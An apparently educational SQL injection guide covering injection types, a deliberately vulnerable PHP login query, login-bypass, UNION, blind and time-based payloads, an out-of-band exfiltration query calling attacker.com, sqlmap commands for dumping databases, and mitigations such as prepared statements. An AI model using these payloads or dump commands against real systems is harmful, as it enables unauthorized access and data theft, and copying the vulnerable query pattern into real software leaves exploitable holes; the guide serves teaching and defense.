#### SQL Injection Guide

1. What is SQL Injection & Its Impact?

Definition

SQL Injection is a web security vulnerability that allows an attacker to inject malicious SQL queries into an SQL statement within a vulnerable web application. This occurs when user inputs are not properly validated, enabling the attacker to manipulate the database.

Impact

A successful SQL Injection attack can lead to:

Authentication Bypass: Accessing user accounts without valid credentials.

Data Exposure: Leaking sensitive data, such as user information or payment details.

Data Manipulation: Deleting, modifying, or stealing user data from the database.

2. SQL Basics

What is SQL?

SQL (Structured Query Language) is used to interact with relational database management systems (DBMS) to create, modify, and manage data.

Common DBMS Examples

MySQL

SQLite

PostgreSQL

Oracle

Microsoft SQL Server (MSSQL)

Key SQL Statements

Statement

Description

SELECT

Retrieves records from tables

INSERT

Adds records to a table

UPDATE

Modifies existing records

DELETE

Removes records from a table

ORDER BY

Sorts records in a result set

LIMIT

Restricts the number of records

WHERE

Filters records based on conditions

SQL Comments

SQL comments are useful in SQL Injection to bypass parts of a query.

MySQL: #comment, -- comment, /*comment*/

PostgreSQL: -- comment, /*comment*/

Oracle: -- comment

SQLite: -- comment, /*comment*/

MSSQL: -- comment, /*comment*/

Vulnerable PHP Example

$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($connection, $query);

If user inputs are not sanitized, an attacker can inject SQL code.

3. SQL Injection Techniques

Types

In-band SQLi

Blind SQLi

Out-of-band SQLi

3.1 In-band SQLi

Error-based SQLi

Goal: Trigger database errors to reveal DBMS info.

Example Input: '

MySQL Error:

You have an error in your SQL syntax...

Oracle Error:

ORA-00933: SQL command not properly ended

Login Bypass Example

Input (username):

admin' OR '1'='1' --

Resulting Query:

SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'

Explanation:

'1'='1' always returns true.

-- comments out the rest.

Bypasses authentication.

Union-based SQLi

Goal: Use UNION to fetch additional data.

Steps:

Find column count:

' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --

Find injectable columns:

' UNION SELECT 'a', NULL --
' UNION SELECT NULL, 'a' --

Extract data:

' UNION SELECT database(), version() --

3.2 Blind SQLi

Boolean-based

' AND 1=1 --     -- True
' AND 1=2 --     -- False

Extract data:

' AND SUBSTRING(database(),1,1)='m' --

Time-based

' AND IF(1=1, SLEEP(5), 0) --
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0) --

Delays response if condition is true.

3.3 Out-of-band SQLi

Goal: Use external channels (e.g., DNS) to exfiltrate data.

Example:

SELECT LOAD_FILE(CONCAT('\\',database(),'.attacker.com\\test'));

4. Dumping Data Using sqlmap

sqlmap is an open-source tool for detecting and exploiting SQL Injection.

Basic Usage

python sqlmap.py -u "http://example.com/?id=1"

Steps

Test for SQLi:

sqlmap -u "http://example.com/?id=1"

List databases:

sqlmap --dbms=mysql -u "http://example.com/?id=1" --dbs

List tables:

sqlmap --dbms=mysql -u "http://example.com/?id=1" -D database_name --tables

Dump table data:

sqlmap --dbms=mysql -u "http://example.com/?id=1" -D database_name -T table_name --dump

Example

sqlmap -u "http://example.com/?id=1" --dbs
sqlmap -u "http://example.com/?id=1" -D users_db --tables
sqlmap -u "http://example.com/?id=1" -D users_db -T users --dump

5. Mitigation

Input Validation: Use whitelisting and strict filters.

Prepared Statements:

$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);

Minimum Privileges: Restrict DB access.

Use ORM: Frameworks like Django, Laravel reduce SQLi risk.

Suppress Errors: Don’t reveal DB errors to users.

6. Tools

sqlmap: Automated SQLi tool.

Burp Suite: For manual SQLi testing.

Havij: SQLi tool (less commonly used today).

